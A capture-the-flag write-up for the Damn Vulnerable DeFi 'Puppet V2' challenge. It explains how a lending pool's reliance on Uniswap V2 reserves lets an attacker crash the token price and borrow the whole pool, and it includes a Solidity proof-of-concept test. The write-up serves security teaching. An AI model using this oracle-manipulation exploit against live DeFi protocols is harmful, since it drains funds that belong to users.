# Puppet V2

The developers of the [previous pool](https://damnvulnerabledefi.xyz/challenges/puppet/) seem to have learned the lesson. And released a new version.

Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. Shouldn't that be enough?

You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance at risk!

Save all funds from the pool, depositing them into the designated recovery account.

#
## Challenge Overview

[official site](https://damnvulnerabledefi.xyz/challenges/puppet-v2)

This challenge is very similar to Puppet V1. The main difference is that the lending pool no longer uses a payable `borrow()` function and the protocol now relies on Uniswap V2 as its price oracle.

In Puppet V1, the collateral requirement was calculated directly from the ETH balance and token balance inside the Uniswap V1 exchange. In this version, the lending pool uses Uniswap V2 reserves to determine the token price.

## Understanding the Oracle

The lending pool calculates the required collateral using the reserves from the Uniswap V2 pair.

```solidity
UniswapV2Library.getReserves(...)
```

The function returns the current reserves stored inside the pair contract.

Unlike Puppet V1, simply sending ETH or WETH to the pair contract does not immediately affect the oracle price because Uniswap V2 uses stored reserves, not raw token balances. The reserves are only updated when a swap, mint, burn, or sync operation occurs.

Because of this, the attack used in Puppet V1 will not work here.

## Vulnerability

Although the oracle mechanism is different, the lending pool still trusts the Uniswap market price as its source of truth.
The attacker starts with a large amount of DVT and can dump all tokens into the DVT/WETH pair. This dramatically decreases the market price of DVT and reduces the amount of WETH required as collateral. After manipulating the price, the attacker can borrow all tokens from the lending pool using a much smaller amount of collateral.

## Exploit Logic

i) Approve the Uniswap V2 router to spend all player DVT

ii) Swap all DVT for ETH through the DVT/WETH pair

iii) Deposit received ETH into WETH

iv) Manipulate the oracle price and reduce the collateral requirement

v) Borrow all DVT from the lending pool

vi) Transfer all borrowed tokens to the recovery account

## Here is the POC

```solidity
function test_puppetV2() public checkSolvedByPlayer {
    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);

    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);

    uniswapV2Router.swapExactTokensForETH(
        token.balanceOf(player),
        1,
        path,
        player,
        block.timestamp
    );

    weth.deposit{value: player.balance}();

    uint256 poolBalance = token.balanceOf(address(lendingPool));

    weth.approve(address(lendingPool), type(uint256).max);

    lendingPool.borrow(poolBalance);

    token.transfer(recovery, poolBalance);
}
```

## Conclusion

The lending pool assumes that the Uniswap V2 market price accurately represents the real value of DVT.

By dumping a large amount of DVT into the liquidity pool, an attacker can manipulate the price oracle, drastically reduce collateral requirements, and borrow all tokens from the lending pool.

This is a classic oracle manipulation vulnerability.

>Okay! This much 

If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**
